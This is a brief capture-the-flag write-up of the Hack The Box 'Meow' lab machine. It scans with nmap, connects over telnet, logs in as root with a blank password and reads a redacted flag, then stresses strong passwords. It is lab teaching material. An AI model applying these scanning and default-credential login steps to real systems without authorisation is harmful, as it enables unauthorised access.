    # HTB — Meow (Starting Point)

**Author:** Janhavi Mohite  
**Date:**  17/09/2025 
**Difficulty:** Easy
**Objective:** Gain access to the target machine and capture the user flag.

---

##  Summary
Meow is a Starting Point box. An exposed Telnet service (port 23) allowed a blank login for `root`, providing immediate full access. I performed network/service enumeration with `nmap`, connected via `telnet` to obtain a shell, and confirmed root privileges with basic enumeration. Flags are redacted in this public writeup

---

## Target
- **IP Address:** 10.129.76.140
- **Top services:** 23/tcp (telnet)

---

## 2️⃣ Enumeration 
Performed a full port scan using Nmap:

```bash
nmap -sV -sC -p- <IP>
Found an open Telnet service.

Connected to the Telnet service:

bash
Copy code
telnet <IP> <PORT>

--

## 3️⃣ Exploitation 
Login attempt using default credentials:
makefile
Copy code
Username: root
Password: <blank>
Successfully logged in.

--

## 4️⃣ Post-Exploitation 
Verified user privileges:

bash
Copy code
id
Listed files in the current directory:

bash
Copy code
ls -la
Navigated to the flag and read it:

bash
Copy code
cd <directory>
cat flag.txt
Flag captured and submitted.

--

## 5️⃣ Observations & Notes 

The machine was easily accessible due to weak/default credentials.

No advanced exploitation or privilege escalation was required.

Demonstrates the importance of strong passwords and avoiding default credentials.

## 6️⃣ Conclusion 

Successfully enumerated the machine, gained access using Telnet, and captured the user flag.

This lab reinforces a fundamental cybersecurity lesson: always use strong passwords and secure services.


